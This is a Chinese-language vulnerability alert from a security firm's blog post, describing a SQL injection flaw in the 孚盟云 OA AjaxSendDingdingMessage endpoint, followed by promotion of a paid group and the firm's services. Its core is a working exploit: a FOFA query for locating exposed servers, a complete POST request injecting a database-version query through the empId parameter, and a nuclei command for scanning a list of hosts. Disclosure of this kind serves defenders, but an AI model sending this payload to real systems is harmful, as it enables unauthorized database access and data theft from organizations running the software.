#  漏洞预警 孚盟云oa ajaxsenddingdingmessage sql注入漏洞   
by 融云安全-sm  融云攻防实验室   2024-09-26 15:37  
  
**0x01 阅读须知**  
  
**融云安全的技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！**  
  
**0x02 漏洞描述**  
  
孚盟云oa ajaxsenddingdingmessage 存在sql注入漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/GWXBjgPE49xUETYdiavvyibvUkiaFMSO5Hjb6jWb789uhgzu8uG16O7k3cMC7M9IWHKXM8WUJgAUjYict6wdLI0sLQ/640?wx_fmt=jpeg&from=appmsg "")  
  
**0x03 漏洞复现**  
  
**fofa-query: body="hidLicResult" && body="hidProductID"**  
  
1.执行poc进行数据库版本查询，得到结果  
```
POST /m/Dingding/Ajax/AjaxSendDingdingMessage.ashx HTTP/1.1
Host: 
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
X-Requested-With: XMLHttpRequest
Content-Length: 51

action=SendDingMeg_Mail&empId=2'+and+1=@@VERSION--+
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/GWXBjgPE49xUETYdiavvyibvUkiaFMSO5HjQUAlHQk3j8DTVIRLy4xdibt1v5lSL6sZtwXETyMYKtknmmGjJ5iclhWg/640?wx_fmt=jpeg&from=appmsg "")  
  
2.nuclei验证脚本已发布于知识星球  
```
nuclei.exe -t fumengyun-oa-ajaxsenddingdingmessage-sqli.yaml -l subs.txt -stats
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/GWXBjgPE49xUETYdiavvyibvUkiaFMSO5HjZmAQXox3ApKSsHo4WR8bAh2OTO8qHbibmvlQWtbZvZRicjfKicpplE5JA/640?wx_fmt=jpeg&from=appmsg "")  
  
**加入星球请扫描下方二维码，更多精，敬请期待！**  
  
👇👇👇  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/GWXBjgPE49zs4eNkNzwGvylxKjRnH2aibQqdbEUPicwHRpyuIhk7YdcECWw9kZGCibot3aRDzS4ADTmywx57c7QBw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
****  
**星球亮点：**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/GWXBjgPE49wOibwjXDprJGvrk2gbZcTcOtD9ztDD6NyMvkNhUuMN8yPWicCI7MjOWvTQibLgQsXUqBPY0jPwHzQ6A/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**0x05 公司简介**  
  
江西渝融云安全科技有限公司，2017年发展至今，已成为了一家集云安全、物联网安全、数据安全、等保建设、风险评估、信息技术应用创新及网络安全人才培训为一体的本地化高科技公司，是江西省信息安全产业链企业和江西省政府部门重点行业网络安全事件应急响应队伍成员。  
    公司现已获得信息安全集成三级、信息系统安全运维三级、风险评估三级等多项资质认证，拥有软件著作权十八项；荣获2020年全国工控安全深度行安全攻防对抗赛三等奖；庆祝建党100周年活动信息安全应急保障优秀案例等荣誉......  
**公司安全团队，‌承接多样项目！‌CNNVD/CNVD证书、‌代码审计、‌渗透测试等一站式服务，欢迎咨询！**  
‌  
  
**编制：sm**  
  
**审核：fjh**  
  
**审核：Dog**  
  
****  
**1个1朵********5毛钱**  
  
**天天搬砖的小M**  
  
**能不能吃顿好的**  
  
**就看你们的啦**  
  
****  
